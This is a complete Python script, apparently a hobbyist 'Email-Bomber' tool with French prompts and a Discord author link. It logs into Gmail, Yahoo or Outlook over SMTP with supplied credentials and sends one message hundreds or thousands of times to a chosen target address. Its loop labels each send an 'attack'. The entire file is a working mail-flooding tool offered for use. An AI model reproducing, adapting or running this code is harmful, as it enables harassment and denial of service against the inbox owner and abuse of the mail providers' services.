
import smtplib
import sys


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'


def banner():
    print(bcolors.GREEN + '+[+[+[ Email-Bomber v1.0 ]+]+]+')
    print(bcolors.GREEN + '+[+[+[ made with codes ]+]+]+')
    print(bcolors.GREEN + '''
                     \|/
                       `--+--'
                          |
                      ,--'#`--.
                      |#######|
                   _.-'#######`-._
                ,-'###############`-.
              ,'#####################`,                                                                                        
             |#########################|       
            |###########################|      
           |#############################|
           |#############################|              Author: TKSHI
           |#############################|              Discord: https://discord.gg/C9XwehU
            |###########################|
             \#########################/
              `.#####################,'
                `._###############_,'
                   `--..#####..--'     


         _____ _____ _____ _____ _____ _____ __    
        |     | __  | __  |     |_   _|  _  |  |   
        |  |  |    -| __ -|-   -| | | |     |  |__ 
        |_____|__|__|_____|_____| |_| |__|__|_____|                            ,-.--.
*.______________________________________________________________,' (BOOMMMM)
                                                                    `--' ''')


class Email_Bomber:
    count = 0

    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Initialisation du programme... ]+]+]+')
            self.target = str(input(bcolors.GREEN + 'Entrez l email cible <: '))
            self.mode = int(input(bcolors.GREEN + 'Choisissez le mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Option invalide. Recommencez.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Préparation du mode ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.GREEN + 'Choisissez votre montant <: '))
            print(bcolors.RED + f'\n+[+[+[ Vous avez choissie le mode: {self.mode} et le montant {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Lancement de l email ]+]+]+')
            self.server = str(input(bcolors.GREEN + 'Choisissez le serveur de l email - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.GREEN + 'Entrez le numero du port <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.GREEN + 'Email <: '))
            self.fromPwd = str(input(bcolors.GREEN + 'Mot de passe <: '))
            self.subject = str(input(bcolors.GREEN + 'Sujet <: '))
            self.message = str(input(bcolors.GREEN + 'Message <: '))

            self.msg = '''De: %s\nPour: %s\nSujet: %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'ATTAQUE: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n+[+[+[ Attaque en cours... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n+[+[+[ Attaque finit ]+]+]+')
        sys.exit(0)


if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
